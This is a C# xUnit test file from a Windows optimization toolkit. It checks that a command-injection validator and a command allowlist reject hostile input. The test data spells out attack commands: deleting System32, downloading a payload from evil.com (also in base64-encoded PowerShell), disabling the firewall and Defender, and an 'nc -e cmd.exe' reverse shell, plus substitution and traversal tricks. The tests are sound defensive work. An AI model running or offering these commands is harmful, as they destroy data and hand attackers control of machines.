using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using FluentAssertions;
using UniversalDeviceToolkit.Lib.Optimization;
using UniversalDeviceToolkit.Lib.System;
using Xunit;

namespace UniversalDeviceToolkit.Tests.CLI;

/// <summary>
/// Unit tests for command injection prevention and driver interface security.
/// </summary>
[Trait("Category", TestCategories.Security)]
public class CommandInjectionTests
{
    #region CommandInjectionValidator Tests

    [Theory]
    [InlineData("command1 && command2", true)]
    [InlineData("command1 || command2", true)]
    [InlineData("command1; command2", true)]
    [InlineData("command1 | command2", true)]
    [InlineData("`command`", true)]
    [InlineData("$(command)", true)]
    [InlineData("../path", true)]
    [InlineData("..\\path", true)]
    [InlineData("${VAR}", true)]
    [InlineData("command <(subprocess)", true)]
    public void ContainsDangerousPatterns_WithDangerousInput_ShouldReturnTrue(string input, bool expected)
    {
        // Act
        var result = CommandInjectionValidator.ContainsDangerousPatterns(input);

        // Assert
        result.Should().Be(expected);
    }

    [Theory]
    [InlineData("echo test")]
    [InlineData("powercfg /list")]
    [InlineData("ipconfig /all")]
    [InlineData(">nul 2>&1")]
    [InlineData("1>&2")]
    [InlineData("2>&1")]
    [InlineData("output.txt")]
    [InlineData("C:\\Windows\\System32\\powercfg.exe")]
    public void ContainsDangerousPatterns_WithSafeInput_ShouldReturnFalse(string input)
    {
        // Act
        var result = CommandInjectionValidator.ContainsDangerousPatterns(input);

        // Assert
        result.Should().BeFalse($"Input '{input}' should be considered safe");
    }

    [Theory]
    [InlineData("echo test&&whoami", true)]
    [InlineData("echo test||whoami", true)]
    [InlineData("echo test;whoami", true)]
    [InlineData("echo test|whoami", true)]
    public void ContainsDangerousPatterns_WithNoSpaceCommandChaining_ShouldReturnTrue(string input, bool expected)
    {
        // Act
        var result = CommandInjectionValidator.ContainsDangerousPatterns(input);

        // Assert
        result.Should().Be(expected);
    }

    [Theory]
    [InlineData("-enc c29tZSBiYXNlNjQgZGF0YQ==", true)]
    [InlineData("-eN c29tZQ==", true)]
    [InlineData("iex $command", true)]
    [InlineData("Invoke-Expression $cmd", true)]
    public void ContainsDangerousPatterns_WithPowerShellObfuscation_ShouldReturnTrue(string input, bool expected)
    {
        // Act
        var result = CommandInjectionValidator.ContainsDangerousPatterns(input);

        // Assert
        result.Should().Be(expected);
    }

    [Fact]
    public void ContainsDangerousPatterns_WithNullInput_ShouldReturnFalse()
    {
        // Act
        var result = CommandInjectionValidator.ContainsDangerousPatterns(null!);

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ContainsDangerousPatterns_WithEmptyInput_ShouldReturnFalse()
    {
        // Act
        var result = CommandInjectionValidator.ContainsDangerousPatterns(string.Empty);

        // Assert
        result.Should().BeFalse();
    }

    [Fact]
    public void ContainsDangerousPatterns_WithWhitespaceInput_ShouldReturnFalse()
    {
        // Act
        var result = CommandInjectionValidator.ContainsDangerousPatterns("   ");

        // Assert
        result.Should().BeFalse();
    }

    [Theory]
    [InlineData("echo test^\u0026done", false)]  // Escaped ampersand
    [InlineData("echo test && done", true)]   // Command chaining
    public void ContainsDangerousPatterns_WithEscapedAmpersand_ShouldHandleCorrectly(string input, bool expected)
    {
        // Act
        var result = CommandInjectionValidator.ContainsDangerousPatterns(input);

        // Assert
        result.Should().Be(expected);
    }

    #endregion

    #region WindowsOptimizationService.IsValidCommand Tests

    [Theory]
    [InlineData("powercfg /list", true)]
    [InlineData("ipconfig /all", true)]
    [InlineData("netsh interface show interface", true)]
    [InlineData("dism /online /get-features", true)]
    public void IsValidCommand_WithAllowedCommands_ShouldReturnTrue(string command, bool expected)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert
        result.Should().Be(expected);
    }

    [Theory]
    [InlineData("powercfg /list && whoami", false)]
    [InlineData("ipconfig /all | whoami", false)]
    [InlineData("netsh && calc.exe", false)]
    [InlineData("dism;whoami", false)]
    [InlineData("cmd /c whoami", false)]
    public void IsValidCommand_WithInjectionAttempt_ShouldReturnFalse(string command, bool expected)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert
        result.Should().Be(expected);
    }

    [Theory]
    [InlineData("hacktool.exe", false)]
    [InlineData("malware.bat", false)]
    [InlineData("unknown_command", false)]
    [InlineData("nc -e cmd.exe", false)]
    public void IsValidCommand_WithUnknownExecutable_ShouldReturnFalse(string command, bool expected)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert
        result.Should().Be(expected);
    }

    [Theory]
    [InlineData(null, false)]
    [InlineData("", false)]
    [InlineData("   ", false)]
    public void IsValidCommand_WithNullOrEmptyInput_ShouldReturnFalse(string? command, bool expected)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(command!);

        // Assert
        result.Should().Be(expected);
    }

    [Theory]
    [InlineData("powercfg.exe /list", true)]
    [InlineData(@"C:\Windows\System32\powercfg.exe /list", true)]
    [InlineData("\"C:\\Program Files\\Tool\\app.exe\" /arg", false)]
    public void IsValidCommand_WithPaths_ShouldValidateCorrectly(string command, bool expected)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert
        result.Should().Be(expected);
    }

    #endregion

    #region Command Injection Attack Scenarios

    [Theory]
    [InlineData("powercfg /list && del /f /q C:\\Windows\\System32\\*.*")]
    [InlineData("ipconfig | powershell -Command \"Invoke-WebRequest http://evil.com/payload.ps1 -OutFile C:\\temp\\payload.ps1\"")]
    [InlineData("netsh advfirewall set allprofiles state off && whoami")]
    [InlineData("dism /online /disable-feature /featurename:Microsoft-Windows-Defender | taskkill /f /im explorer.exe")]
    public void IsValidCommand_WithRealWorldAttackVectors_ShouldReturnFalse(string maliciousCommand)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(maliciousCommand);

        // Assert
        result.Should().BeFalse($"Command '{maliciousCommand}' should be blocked as malicious");
    }

    [Theory]
    [InlineData("powercfg -enc c29tZSBiYXNlNjQgZGF0YQ==")]
    [InlineData("ipconfig;powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA")]
    public void IsValidCommand_WithEncodedPayloads_ShouldReturnFalse(string encodedCommand)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(encodedCommand);

        // Assert
        result.Should().BeFalse($"Encoded command '{encodedCommand}' should be blocked");
    }

    [Theory]
    [InlineData("powercfg $(whoami)")]
    [InlineData("ipconfig `whoami`")]
    [InlineData("netsh ${env:USERPROFILE}")]
    public void IsValidCommand_WithCommandSubstitution_ShouldReturnFalse(string command)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert
        result.Should().BeFalse($"Command with substitution '{command}' should be blocked");
    }

    #endregion

    #region Action Key Validation Tests

    [Theory]
    [InlineData("cleanup.temp", true)]
    [InlineData("service.disable-update", true)]
    [InlineData("registry.optimization_1", true)]
    [InlineData("cleanup-temp", true)]
    [InlineData("service_disable_update", true)]
    public void IsValidActionKey_WithValidKeys_ShouldReturnTrue(string key, bool expected)
    {
        // This tests the private method indirectly through public API behavior
        // We verify that valid action keys are accepted
        
        // Arrange - check pattern directly
        var isValid = System.Text.RegularExpressions.Regex.IsMatch(key, @"^[a-zA-Z0-9._-]+$");

        // Assert
        isValid.Should().Be(expected, $"Key '{key}' should be valid");
    }

    [Theory]
    [InlineData("cleanup;whoami", false)]
    [InlineData("service&&calc", false)]
    [InlineData("registry|del", false)]
    [InlineData("cleanup temp", false)]
    [InlineData("service$var", false)]
    [InlineData("registry@home", false)]
    [InlineData("../etc/passwd", false)]
    public void IsValidActionKey_WithInvalidKeys_ShouldReturnFalse(string key, bool expected)
    {
        // Arrange - check pattern directly
        var isValid = System.Text.RegularExpressions.Regex.IsMatch(key, @"^[a-zA-Z0-9._-]+$");

        // Assert
        isValid.Should().Be(expected, $"Key '{key}' should be invalid");
    }

    #endregion

    #region Service Name Validation Tests

    [Theory]
    [InlineData("wuauserv", true)]
    [InlineData("bits", true)]
    [InlineData("dhcp-client", true)]
    [InlineData("LanmanServer", true)]
    [InlineData("cryptsvc", true)]
    public void IsValidServiceName_WithValidNames_ShouldReturnTrue(string serviceName, bool expected)
    {
        // Arrange - check pattern directly
        var isValid = System.Text.RegularExpressions.Regex.IsMatch(serviceName, @"^[a-zA-Z0-9_-]+$");

        // Assert
        isValid.Should().Be(expected, $"Service name '{serviceName}' should be valid");
    }

    [Theory]
    [InlineData("service;whoami", false)]
    [InlineData("wuauserv && calc", false)]
    [InlineData("dhcp | del", false)]
    [InlineData("service name", false)]
    [InlineData("wuauserv$", false)]
    [InlineData("../service", false)]
    public void IsValidServiceName_WithInvalidNames_ShouldReturnFalse(string serviceName, bool expected)
    {
        // Arrange - check pattern directly
        var isValid = System.Text.RegularExpressions.Regex.IsMatch(serviceName, @"^[a-zA-Z0-9_-]+$");

        // Assert
        isValid.Should().Be(expected, $"Service name '{serviceName}' should be invalid");
    }

    #endregion

    #region SanitizeInput Tests

    [Theory]
    [InlineData("echo test && whoami", "echo test  whoami")]
    [InlineData("command;other", "commandother")]
    [InlineData("cmd|pipe", "cmdpipe")]
    [InlineData("test`backtick", "testbacktick")]
    public void SanitizeInput_WithDangerousInput_ShouldRemoveDangerousChars(string input, string expected)
    {
        // Act
        var result = CommandInjectionValidator.SanitizeInput(input);

        // Assert
        result.Should().Be(expected);
    }

    [Fact]
    public void SanitizeInput_WithSafeInput_ShouldReturnUnchanged()
    {
        // Arrange
        var input = "powercfg /list";

        // Act
        var result = CommandInjectionValidator.SanitizeInput(input);

        // Assert
        result.Should().Be(input);
    }

    [Fact]
    public void SanitizeInput_WithNullInput_ShouldReturnNull()
    {
        // Act
        var result = CommandInjectionValidator.SanitizeInput(null!);

        // Assert
        result.Should().BeNull();
    }

    #endregion

    #region Integration Tests with CMD

    [Fact]
    public async Task RunAsync_WithPowerShellEncodedCommand_ShouldThrow()
    {
        // Arrange
        var file = "powershell.exe";
        var arguments = "-enc c29tZSBiYXNlNjQgZGF0YQ==";

        // Act
        Func<Task> act = async () => await CMD.RunAsync(file, arguments, waitForExit: true);

        // Assert
        await act.Should().ThrowAsync<ArgumentException>();
    }

    [Fact]
    public async Task RunAsync_WithIEXCommand_ShouldThrow()
    {
        // Arrange
        var file = "powershell.exe";
        var arguments = "-Command \"iex 'Write-Host test'\"";

        // Act
        Func<Task> act = async () => await CMD.RunAsync(file, arguments, waitForExit: true);

        // Assert
        await act.Should().ThrowAsync<ArgumentException>();
    }

    [Fact]
    public async Task RunAsync_WithDirectoryTraversal_ShouldThrow()
    {
        // Arrange
        var file = "cmd.exe";
        var arguments = "/c echo test ../../Windows/System32/calc.exe";

        // Act
        Func<Task> act = async () => await CMD.RunAsync(file, arguments, waitForExit: true);

        // Assert
        await act.Should().ThrowAsync<ArgumentException>();
    }

    [Fact]
    public async Task RunAsync_WithBacktickInjection_ShouldThrow()
    {
        // Arrange
        var file = "cmd.exe";
        var arguments = "/c echo `whoami`";

        // Act
        Func<Task> act = async () => await CMD.RunAsync(file, arguments, waitForExit: true);

        // Assert
        await act.Should().ThrowAsync<ArgumentException>();
    }

    #endregion

    #region Whitelist Enforcement Tests

    [Fact]
    public void IsValidCommand_WithPowerShellDirectly_ShouldReturnFalse()
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand("powershell.exe -Command Write-Host test");

        // Assert - PowerShell is not in the allowlist
        result.Should().BeFalse();
    }

    [Fact]
    public void IsValidCommand_WithCmdExeDirectly_ShouldReturnTrue()
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand("cmd.exe /c echo test");

        // Assert - cmd.exe is in the allowlist
        result.Should().BeTrue();
    }

    [Theory]
    [InlineData("reg add \"HKLM\\Software\" /v Test /t REG_SZ /d data", true)]
    [InlineData("reg query \"HKLM\\Software\\Microsoft\\Windows\"", true)]
    public void IsValidCommand_WithRegCommand_ShouldValidate(string command, bool expected)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert
        result.Should().Be(expected, $"Command '{command}' should be valid");
    }

    #endregion

    #region Complex Attack Vector Tests

    [Theory]
    [InlineData("powercfg /s 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c")]  // Valid GUID
    [InlineData("powercfg /change monitor-timeout-ac 10")]
    [InlineData("powercfg /hibernate on")]
    public void IsValidCommand_WithValidPowercfgCommands_ShouldReturnTrue(string command)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert
        result.Should().BeTrue($"Valid powercfg command should be accepted: {command}");
    }

    [Theory]
    [InlineData("powercfg /s 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c && whoami")]
    [InlineData("powercfg /change monitor-timeout-ac 10 | del C:\\test.txt")]
    public void IsValidCommand_WithInjectedPowercfgCommands_ShouldReturnFalse(string command)
    {
        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert
        result.Should().BeFalse($"Injected command should be blocked: {command}");
    }

    [Fact]
    public void IsValidCommand_WithUnicodeObfuscation_ShouldHandle()
    {
        // Arrange - Unicode homoglyph attack attempt
        var command = "pоwercfg /list";  // Note: 'о' is Cyrillic, not Latin 'o'

        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert - This would fail the executable check since it's not an exact match
        result.Should().BeFalse();
    }

    [Fact]
    public void IsValidCommand_WithNullByteInjection_ShouldReturnFalse()
    {
        // Arrange
        var command = "powercfg /list%00whoami";

        // Act
        var result = WindowsOptimizationService.IsValidCommand(command);

        // Assert
        result.Should().BeFalse();
    }

    #endregion
}

/// <summary>
/// Extension class to expose IsValidCommand for testing
/// </summary>
public static class WindowsOptimizationServiceTestExtensions
{
    /// <summary>
    /// Public wrapper for IsValidCommand testing
    /// </summary>
    public static bool IsValidCommand(string command)
    {
        // Use reflection to access the private static method
        var method = typeof(WindowsOptimizationService).GetMethod("IsValidCommand", 
            System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
        return (bool)method!.Invoke(null, new object[] { command })!;
    }
}
